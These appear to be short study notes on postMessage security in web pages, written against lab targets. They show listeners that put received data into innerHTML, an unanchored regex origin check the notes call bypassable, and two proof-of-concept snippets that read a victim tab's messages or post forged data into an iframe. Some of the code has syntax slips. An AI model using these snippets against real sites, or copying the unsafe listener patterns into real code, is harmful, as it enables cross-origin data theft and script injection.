**EXPLAIN**

- We can use it postMessage with iframe or pop-up
- To create **event listener** we will give it a name and a function to call when it used, this function will take the value from postMessage and do its actions.
    
    ```jsx
    <script type="text/javascript">
    			window.addEventListener("message", displayMessage)
    		  function displayMessage(message){ 
    					var recv "User said: message.data; " 
    					document.getElementById("type").innerHTML = recv 
    		}
    </script>
    ```
    
- `message.origin`→ will display the origin which send the request.
`message.data`→ will display the sent value.
- We can use the following like to check and validate but the check have an issue and could be
bypassed.

```jsx
window.addEventListener("message", displayMessage) 
function displayMessage(message){ 
	if(/http:\/\/trusteddomain.vuln.labs/.test(message.origin)){ 
		var recV = "User said: "+ message.data; 
		document.getElementById("type").innerHTML = recv 
	}
}
```

**POC**

```jsx
<script>
		window.addEventListener("message", print) 
		function print(event){
				document.write(JSON.stringify(event.data))
		}
		window.open("<vulnerable-tab>(i.e http://pt1-75d4e497-db84ad23.libcurl.so/key/1)")
</script>
```

```jsx
<script>
	function hack(){
		document.getElementById("iframe").contentWindow.postMessage('user=victim&id=0','*');
	}
</script>
<iframe id="iframe" onload="hack()" src="<Vulnerable-tab>(i.e http://pt1-77adaa63-c2c6431d.libcurl.so/)">
```
